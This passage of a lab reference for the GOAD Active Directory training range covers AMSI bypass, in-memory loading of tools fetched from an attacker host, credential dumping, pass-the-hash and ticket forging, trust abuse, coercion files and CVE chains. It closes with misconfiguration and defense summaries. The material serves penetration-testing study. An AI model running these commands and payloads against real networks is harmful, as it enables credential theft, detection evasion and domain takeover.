**Vulnerability:** PowerShell AMSI can be bypassed using multi-stage techniques

- **Two-Stage Approach:**
  1. **PowerShell Level:** Modified reflection methods with string fragmentation to avoid signature detection
     - Fragment known signatures: `"Am'+'siUt'+'ils"` instead of `"AmsiUtils"`
     - Use reflection to access internal .NET methods
  2. **.NET Level:** Patch amsi.dll's `AmsiScanBuffer` function using kernel32 API calls
     - Use `GetProcAddress` to locate the function
     - Modify memory protection with `VirtualProtect`
     - Patch the function to return clean scan results
- **Common Bypass Patterns:**

  ```powershell
  # Example string fragmentation pattern
  $a = 'Sy'+'st'+'em.Ma'+'nag'+'ement.Aut'+'omtic'+'on.Am'+'siUt'+'ils'
  ```

- **Impact:** Execute malicious PowerShell and load .NET assemblies without AV detection
- **Note:** Modern EDR may still detect behavioral patterns even with AMSI bypass

### In-Memory Execution

**Vulnerability:** Lack of EDR/AV monitoring of .NET assembly loading

- **Philosophy:** "The disk is lava" - avoid writing files to disk to evade file-based detection
- **Method:** Load .NET assemblies directly into memory using `Assembly.Load()` or reflection
- **Tools & Techniques:**
  - **PowerSharpPack:** Pre-compiled .NET tools wrapped with public class/method interfaces for easy PowerShell invocation
  - **Invoke-SharpLoader:** Generic loader for .NET assemblies
  - **WinPEAS:** Enumeration tool loaded entirely in memory via `Assembly.Load()` from HTTP-served payloads
- **Example Loading Pattern:**

  ```powershell
  # Download and load assembly in memory
  $bytes = (New-Object Net.WebClient).DownloadData('http://attacker/tool.exe')
  [System.Reflection.Assembly]::Load($bytes)
  [Namespace.Class]::Method()
  ```

- **CheckPort.exe:** Verify available ports for reverse shells before exploitation
- **Impact:** Defense evasion - bypasses file-based AV/EDR detection

### Web Shell Upload

**Vulnerability:** IIS application with file upload functionality

- **Target in GOAD:** 192.168.56.22 (IIS server with vulnerable upload functionality)
- **Example:** Simple ASP.NET application allowing unrestricted file uploads without extension validation
- **Exploitation:**
  1. Upload ASPX web shell via vulnerable upload form

     ```bash
     # Common web shells: cmd.aspx, simple-backdoor.aspx
     ```

  2. Access web shell via browser at uploaded path

     ```text
     http://192.168.56.22/uploads/shell.aspx
     ```

  3. Execute commands as IIS AppPool identity (has SeImpersonate)
  4. Chain with potato exploits for SYSTEM
- **Post-Upload Attack Path:**
  1. Verify privileges: `whoami /priv` (look for SeImpersonatePrivilege)
  2. Bypass AMSI if using PowerShell
  3. Load exploitation tools in memory
  4. Execute SweetPotato/PrintSpoofer for SYSTEM
- **Impact:** Initial access → SeImpersonate → SYSTEM privileges

### SCMUACBypass

**Vulnerability:** UAC bypass techniques

- **Impact:** Elevation from medium to high integrity process
- **Tools:** SCMUACBypass

---

## Lateral Movement

### Credential Extraction

#### SAM Database Dumping

**Method:** Extract NT hashes from `C:\Windows\System32\config\SAM`

- **Requirements:** Local admin access, SYSTEM/SAM hives
- **Tools:** secretsdump.py, reg save
- **Exploitation:**

  ```bash
  secretsdump.py -sam SAM -system SYSTEM LOCAL
  ```

#### LSA Secrets & Cached Credentials

**Method:** Extract from `HKLM\SECURITY` registry hive

- **Data Retrieved:**
  - Cached domain logon information (DCC2 hashes)
  - Machine account credentials
  - Service account passwords
- **Tools:** secretsdump.py, mimikatz

#### LSASS Process Dumping

**Method:** Extract credentials from memory

- **Tools:** lsassy, Dumpert, procdump, mimikatz
- **Retrieved Data:**
  - Domain NTLM hashes
  - Kerberos tickets (TGT/TGS)
  - Plaintext passwords (if WDigest enabled)
- **Exploitation:**

  ```bash
  lsassy -u user -p password -d domain target-ip
  ```

### Lateral Movement Techniques

#### Pass-The-Hash (PTH)

**Method:** Authenticate using NT hash without password

- **Tools:** crackmapexec, impacket, evil-winrm
- **Exploitation:**

  ```bash
  cme smb target-range -u administrator -H ntlm-hash
  wmiexec.py -hashes :ntlm-hash administrator@target
  ```

#### Impacket Remote Execution

**Methods:**

- **psexec.py:** Service-based execution (most detectable)
- **wmiexec.py:** WMI process creation (stealthier)
- **smbexec.py:** Service creation per request (no executable upload)
- **atexec.py:** Scheduled task exploitation
- **dcomexec.py:** DCOM abuse

#### Evil-WinRM

**Method:** PowerShell remoting over HTTP/HTTPS

- **Port:** 5985 (HTTP), 5986 (HTTPS)
- **Requirements:** Valid credentials or hash
- **Exploitation:**

  ```bash
  evil-winrm -i target -u user -p password
  evil-winrm -i target -u user -H ntlm-hash
  ```

#### RDP with Restricted Admin

**Method:** RDP without sending credentials to target

- **Requirements:** Restricted Admin mode enabled
- **Tools:** xfreerdp
- **Exploitation:**

  ```bash
  xfreerdp /u:administrator /pth:ntlm-hash /v:target /restricted-admin
  ```

#### Over-Pass-The-Hash

**Method:** Convert NT hash to Kerberos TGT

- **Tools:** Rubeus, getTGT.py
- **Exploitation:**

  ```bash
  getTGT.py domain/user -hashes :ntlm-hash
  export KRB5CCNAME=user.ccache
  ```

#### Pass-The-Ticket

**Method:** Use extracted Kerberos tickets

- **Source:** LSASS memory dumps, Rubeus extraction
- **Tools:** Rubeus, ticketConverter.py
- **Exploitation:**

  ```bash
  export KRB5CCNAME=ticket.ccache
  smbclient.py -k dc.domain.local
  ```

#### Certificate-Based Authentication

**Method:** Use compromised certificates for authentication

- **Tools:** certipy
- **Exploitation:**

  ```bash
  certipy auth -pfx user.pfx -dc-ip 192.168.56.11
  ```

---

## Domain Trust Exploitation

### Child-to-Parent Domain Escalation

#### Golden Ticket + ExtraSid

**Vulnerability:** Child domain compromise allows parent domain escalation

- **Attack Chain:**
  1. Extract child domain krbtgt hash (DCSync)
  2. Obtain child and parent domain SIDs
  3. Forge golden ticket with parent's Enterprise Admins SID (SID-519)
  4. Authenticate to parent domain as Enterprise Admin
- **Tools:** ticketer.py, mimikatz
- **Exploitation:**

  ```bash
  # Get krbtgt hash and SIDs
  secretsdump.py domain/user:password@dc

  # Forge ticket
  ticketer.py -nthash krbtgt-hash -domain child.domain.local -domain-sid S-1-5-21-CHILD-SID -extra-sid S-1-5-21-PARENT-SID-519 -user-id 500 administrator

  # Use ticket
  export KRB5CCNAME=administrator.ccache
  secretsdump.py -k parent-dc.domain.local -just-dc
  ```

#### Trust Ticket (Inter-Realm TGT)

**Vulnerability:** Trust keys enable cross-domain authentication

- **Attack Chain:**
  1. Extract trust key (target domain's NetBIOS name in NTDS)
  2. Forge inter-realm TGT with SPN `krbtgt/parent_domain`
  3. Request TGS in parent domain
- **Advantage:** Works even if krbtgt password changed twice
- **Tools:** ticketer.py, mimikatz

#### RaiseMeUp / raiseChild

**Vulnerability:** Automated child-to-parent escalation

- **Tool:** raiseChild.py (Impacket)
- **Exploitation:**

  ```bash
  raiseChild.py child.domain.local/admin:password
  ```

- **Impact:** Single command creates golden ticket for enterprise admin

#### Unconstrained Delegation (Forest Trusts)

**Vulnerability:** DCs have unconstrained delegation by default

- **Attack Chain:**
  1. Compromise unconstrained delegation account in child domain
  2. Coerce parent DC authentication (PetitPotam)
  3. Extract parent DC TGT
  4. DCSync parent domain
- **Impact:** Parent domain compromise

### Forest-to-Forest Trust Exploitation

#### Password Reuse Across Forests

**Vulnerability:** Identical usernames with same passwords in different forests

- **Method:** Dump NTDS from one forest, test against other forests
- **Common:** Frequently exploitable in production environments

#### Foreign Group/User Exploitation

**Vulnerability:** Cross-forest group memberships (Foreign Security Principals)

- **Discovery:** Enumerate foreign users/groups in trusted forests
- **Attack Vectors:**
  - Shadow credentials
  - Password changes
  - Kerberoasting
- **Tools:** BloodHound, PowerView

#### SID History Abuse

**Vulnerability:** SID history enabled on forest trusts

- **Attack:** Forge golden tickets with external forest group memberships
- **Exploitation:** "Can spoof any RID >1000 group if SID history is enabled"
- **Impact:** ACL exploitation across domain boundaries

#### MSSQL Trusted Links (Cross-Forest)

**Vulnerability:** Database trust relationships span forest boundaries

- **Attack:** Use linked servers to execute commands across forests
- **Impact:** Cross-forest pivoting and command execution

---

## User-Level Attacks

### File-Based Coercion

#### Shortcut Files (.lnk)

**Vulnerability:** Windows resolves UNC paths in .lnk files when viewed

- **Tool:** crackmapexec slinky module
- **Exploitation:**

  ```bash
  cme smb target -u user -p password -M slinky -o SERVER=attacker-ip NAME=document
  ```

- **Impact:** NetNTLM hash capture via Responder

#### .scf Files

**Vulnerability:** Shell command files trigger authentication

- **Tool:** crackmapexec scuffy module
- **Similar to:** .lnk files but using different file format

#### .url Files

**Vulnerability:** Internet shortcut files with UNC paths

- **Method:** Create .url file pointing to attacker-controlled UNC path
- **Trigger:** User browses share containing malicious .url file
- **Impact:** Authentication callback for hash capture

### WebDAV-Based Coercion

**Vulnerability:** WebClient service can be triggered to start, enabling HTTP-based authentication

- **Method:** Upload `.searchConnector-ms` files to accessible shares
- **searchConnector-ms File Structure:**

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <searchConnectorDescription>
    <iconReference>\\attacker-ip@80\webdav\icon.ico</iconReference>
    <description>Search</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
      <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
      <url>\\attacker-ip@80\webdav</url>
    </simpleLocation>
  </searchConnectorDescription>
  ```

- **Attack Chain:**
  1. Drop `.searchConnector-ms` file on accessible share
  2. When user browses the share, WebClient service starts
  3. HTTP-based authentication triggered (bypasses SMB signing requirements)
  4. Relay to LDAPS for shadow credentials or RBCD attacks
- **Requirements:**
  - WebClient service installed (workstations, not servers by default)
  - User must browse the share containing the malicious file
- **LDAP Relay (if signing not enforced):**
  - Add shadow credentials → PKINIT authentication
  - Configure RBCD → impersonate admin
- **Impact:** HTTP-to-LDAP relay enables domain compromise on workstations

### Token Impersonation

**Vulnerability:** Available tokens on compromised systems can be stolen

- **Method:** Use stolen tokens to execute commands as other users without credentials
- **Token Types:**
  - **Delegation tokens:** Created for interactive logins (RDP, console)
  - **Impersonation tokens:** Created for non-interactive sessions
- **Tools:** incognito (Meterpreter), Invoke-TokenManipulation, TokenDuplicator
- **Exploitation Flow:**

  ```powershell
  # List available tokens
  Invoke-TokenManipulation -Enumerate

  # Impersonate specific user token
  Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\admin"

  # Execute command with impersonated token
  Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "DOMAIN\admin"
  ```

- **Requirements:** Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
- **Impact:** Execute commands as other logged-in users without their credentials

### RDP Session Hijacking

**Vulnerability:** Administrator can redirect active RDP sessions (Server 2016)

- **Method:** Use `tscon.exe` to redirect active sessions to attacker's session
- **Requirements:**
  - SYSTEM privileges (use `Psexec64.exe -s cmd.exe` to elevate)
  - Active RDP session exists
  - Vulnerable OS version (primarily Server 2016)
- **Exploitation:**

  ```cmd
  # Enumerate active sessions
  query user

  # Example output:
  #  USERNAME              SESSIONNAME        ID  STATE
  #  administrator         rdp-tcp#1           2  Active
  #  victim_user           rdp-tcp#0           1  Active

  # Hijack victim's session (run from SYSTEM context)
  tscon.exe 1 /dest:rdp-tcp#1
  ```

- **Impact:** Take over another user's active desktop session without credentials

---

## CVE Exploits

### CVE-2021-42287 & CVE-2021-42278 (noPac / SamAccountName Spoofing)

**Vulnerability:** Computer account manipulation for privilege escalation

- **Attack Chain:**
  1. Add computer account (MAQ=10 by default)
  2. Clear computer account SPNs
  3. Rename to match domain controller (without $)
  4. Obtain TGT
  5. Restore original name
  6. Request service tickets via S4U2self
  7. Perform DCSync
- **Tools:** noPac (Windows/cube0x0), noPac.py (Linux/Impacket)
- **Patched:** Late 2021
- **Impact:** Domain admin privileges

### CVE-2021-1675 (PrintNightmare)

**Vulnerability:** Print Spooler service allows arbitrary DLL injection

- **Affected Systems:** Windows Server 2016, 2019 (unpatched)
- **Requirements:**
  - Active Print Spooler service
  - Domain user credentials
  - SMB share for DLL delivery
- **Exploitation:**
  1. Create malicious DLL payload
  2. Host on SMB share
  3. Trigger PrintNightmare exploit
  4. Gain SYSTEM privileges
- **Tools:** CVE-2021-1675.py, cube0x0 PoC
- **Patched:** 2021 (but exploitation still possible if unpatched)
- **Cleanup:** Driver files in spool directories

### CVE-2022-26923 (Certifried)

**Vulnerability:** Computer account DNS hostname spoofing for certificate abuse

- **Attack Chain:**
  1. Create computer account
  2. Set dNSHostName to match DC
  3. Request computer certificate
  4. Certificate issued with DC identity
  5. Authenticate as DC
- **Tools:** Certipy
- **Patched:** May 2022
- **Impact:** Domain controller impersonation, full domain compromise

### CVE-2024-49019 (ESC15)

**Vulnerability:** Certificate request agent application policy abuse

- **Attack:** Request certificates on behalf of privileged users
- **Patched:** November 12, 2024
- **Impact:** Privilege escalation via certificate delegation

### CVE-2019-1040 (Remove-MIC) - NTLM Bypass

**Vulnerability:** NTLM MIC removal bypass

- **Attack:** Relay attacks bypass signing requirements
- **Exploitation:** Used in combination with PrinterBug/PetitPotam
- **Impact:** NTLM relay to LDAPS for domain compromise

### ZeroLogon (CVE-2020-1472)

**Vulnerability:** Netlogon cryptography bypass

- **Impact:** Instant escalation to Domain Admin without credentials
- **Status:** Mentioned as motivation for GOAD creation
- **Note:** In hardened GOAD setups, all hosts patched to latest version, making CVE exploitation impossible
- **Tools:** SecuraBV/CVE-2020-1472

---

## Attack Tools Referenced

### Enumeration & Discovery

- **BloodHound / SharpHound** - AD relationship mapping
- **crackmapexec (cme)** - Multi-protocol enumeration
- **enum4linux** - SMB/RPC enumeration
- **rpcclient** - Direct RPC queries
- **Nmap** - Network scanning, service detection
- **adidnsdump** - DNS record enumeration
- **PowerView** - PowerShell AD enumeration

### Credential Attacks

- **Responder** - LLMNR/NBT-NS poisoning
- **mitm6** - DHCPv6 poisoning
- **hashcat** - Offline hash cracking
- **john** - Password cracking
- **sprayhound** - Password spraying

### Kerberos Attack Tools

- **Rubeus** - Kerberos attacks (Windows)
- **Impacket suite** - Python-based AD attacks
  - GetNPUsers.py - AS-REP roasting
  - GetUserSPNs.py - Kerberoasting
  - getTGT.py / getST.py - Ticket operations
  - secretsdump.py - Credential dumping
  - psexec.py / wmiexec.py / smbexec.py - Remote execution
  - addcomputer.py - Machine account creation
  - rbcd.py - RBCD configuration
  - raiseChild.py - Child-to-parent escalation
  - ticketer.py - Golden/Silver ticket creation

### ADCS Attacks

- **Certipy** - ADCS enumeration and exploitation
- **Certify** - Certificate template enumeration
- **Coercer** - Authentication coercion
- **Pywhisker / Whisker** - Shadow credentials
- **PetitPotam** - Coercion technique

### Lateral Movement Tools

- **evil-winrm** - PowerShell remoting
- **lsassy** - LSASS credential extraction
- **mimikatz** - Credential extraction
- **procdump** - Process dumping

### MSSQL

- **mssqlclient.py** - MSSQL client (Impacket)
- **PowerUpSQL** - PowerShell MSSQL exploitation

### Privilege Escalation Tools

- **PrintSpoofer / SweetPotato / BadPotato** - Token impersonation
- **KrbRelayUp** - Kerberos relay
- **WinPEAS** - Privilege escalation enumeration

### ACL Abuse

- **bloodyAD** - ACL exploitation
- **dacledit.py** - DACL modification
- **SharpGPOAbuse** - GPO abuse

### Web/Network

- **ntlmrelayx** - NTLM relay attacks
- **burp suite** - Web application testing

---

## Key Misconfigurations Summary

| Misconfiguration | Impact | Exploitation |
| --- | --- | --- |
| **NULL sessions enabled** | Anonymous enumeration | User/group discovery, share access |
| **SMB signing disabled** | NTLM relay attacks | Admin access to unsigned hosts |
| **Weak password policy** | Password attacks | Spraying, brute force |
| **Passwords in descriptions** | Immediate compromise | Authenticated access |
| **PreAuth disabled accounts** | AS-REP roasting | Offline hash cracking |
| **Service accounts with SPNs** | Kerberoasting | Offline TGS cracking |
| **MAQ = 10** | Computer creation | RBCD, DNS spoofing, noPac |
| **LDAP signing not enforced** | Kerberos/NTLM relay | RBCD, account creation |
| **Unconstrained delegation** | TGT theft | DC compromise via coercion |
| **Constrained delegation** | Service impersonation | Privilege escalation |
| **GenericWrite on users/computers** | Multiple attack paths | Shadow credentials, RBCD, SPNs |
| **WriteDacl permissions** | ACL manipulation | Privilege escalation chains |
| **Writable GPOs** | Code execution | SYSTEM on GPO scope computers |
| **ADCS misconfigurations** | Certificate abuse | ESC1-15 attacks, domain compromise |
| **Trustworthy databases** | SQL impersonation | Database → instance escalation |
| **SeImpersonate privilege** | Token abuse | SYSTEM privileges |
| **Forest trusts with SID history** | Cross-forest compromise | Golden tickets with foreign SIDs |
| **Password reuse** | Credential stuffing | Multi-domain/forest access |
| **WebClient service** | HTTP coercion | LDAP relay attacks |
| **Print Spooler enabled** | Coercion + relay/CVE | DC authentication capture, RCE |

---

## Defense Recommendations

Based on the vulnerabilities in GOAD, here are key defensive measures:

1. **Disable SMB signing optional** - Enforce SMB signing on all systems
2. **Enforce LDAP signing and channel binding** - Prevent relay attacks
3. **Implement strong password policy** - Complexity requirements, longer passwords
4. **Set MAQ to 0** - Prevent domain users from creating computer accounts
5. **Remove passwords from user descriptions** - Use secure password storage
6. **Enable PreAuth for all users** - Prevent AS-REP roasting
7. **Minimize service accounts with SPNs** - Use gMSA for service accounts
8. **Regularly audit ACLs** - Remove excessive permissions
9. **Constrain delegation carefully** - Only to necessary services
10. **Harden ADCS** - Review certificate templates, enable EPA on web enrollment
11. **Disable Print Spooler** - On systems that don't need printing
12. **Implement privileged access workstations (PAW)** - For admin activities
13. **Enable Credential Guard** - Protect credentials in memory
14. **Monitor for anomalies** - Kerberoasting, DCSync, Golden Tickets
15. **Patch regularly** - Eliminate CVE exploitation vectors

---

## Resources

### Official GOAD Resources

- **GitHub Repository:** https://github.com/Orange-Cyberdefense/GOAD
- **Official Documentation:** https://orange-cyberdefense.github.io/GOAD/
- **Creator's Blog (Mayfly):** https://mayfly277.github.io/

### Walkthrough Series (Mayfly)

1. Part 1 - Reconnaissance and scan: https://mayfly277.github.io/posts/GOADv2-pwning_part1/
2. Part 2 - Find users: https://mayfly277.github.io/posts/GOADv2-pwning-part2/
3. Part 3 - Enumeration with user: https://mayfly277.github.io/posts/GOADv2-pwning-part3/
4. Part 4 - Poison and relay: https://mayfly277.github.io/posts/GOADv2-pwning-part4/
5. Part 5 - Exploit with user: https://mayfly277.github.io/posts/GOADv2-pwning-part5/
6. Part 6 - ADCS: https://mayfly277.github.io/posts/GOADv2-pwning-part6/
7. Part 7 - MSSQL: https://mayfly277.github.io/posts/GOADv2-pwning-part7/
8. Part 8 - Privilege escalation: https://mayfly277.github.io/posts/GOADv2-pwning-part8/
9. Part 9 - Lateral move: https://mayfly277.github.io/posts/GOADv2-pwning-part9/
10. Part 10 - Delegations: https://mayfly277.github.io/posts/GOADv2-pwning-part10/
11. Part 11 - ACL: https://mayfly277.github.io/posts/GOADv2-pwning-part11/
12. Part 12 - Trusts: https://mayfly277.github.io/posts/GOADv2-pwning-part12/
13. Part 13 - Having fun inside a domain: https://mayfly277.github.io/posts/GOADv2-pwning-part13/
14. Part 14 - ADCS (ESC 5/7/9/10/11/13/14/15): https://mayfly277.github.io/posts/ADCS-part14/

### Additional Writeups

- **HackMD Walkthrough:** https://hackmd.io/@jjavierolmedo/goad_writeup
- **CyberForge Blog:** https://cyberforge.blog/writeups/GOAD/
- **E-nzym3 Blog:** https://enzym3.io/posts/goad_walkthrough/
- **Dcodezero:** https://dcodezero.github.io/goad/GOAD-p1/

### Lab Variants

- **GOAD-Light:** Lighter version without Essos domain for lower-spec systems
- **SCCM Lab:** Additional lab for SCCM attacks by Mayfly

---

## Coverage

Compiled from Mayfly277's official writeups (Parts 1-14) and community contributions.

- Part 1: Reconnaissance and scanning
- Part 2: User discovery (ASREPRoast, password spraying)
- Part 3: Authenticated enumeration (BloodHound, Kerberoasting)
- Part 4: Poisoning and relay (Responder, NTLM relay, MITM6)
- Part 5: CVE exploitation (noPac, PrintNightmare)
- Part 6: ADCS attacks (ESC1-8, Certifried, Shadow Credentials)
- Part 7: MSSQL exploitation (impersonation, linked servers)
- Part 8: Privilege escalation (SeImpersonate, KrbRelayUp, AMSI bypass, in-memory execution)
- Part 9: Lateral movement (PTH, PTT, credential extraction)
- Part 10: Delegation attacks (unconstrained, constrained, RBCD)
- Part 11: ACL abuse (ForceChangePassword, GenericWrite, GPO abuse)
- Part 12: Trust exploitation (child-to-parent, forest trusts, golden ticket + ExtraSid)
- Part 13: Post-exploitation (token impersonation, RDP hijacking, file coercion)
- Part 14: Advanced ADCS (ESC5/7/9/10/11/13/14/15)
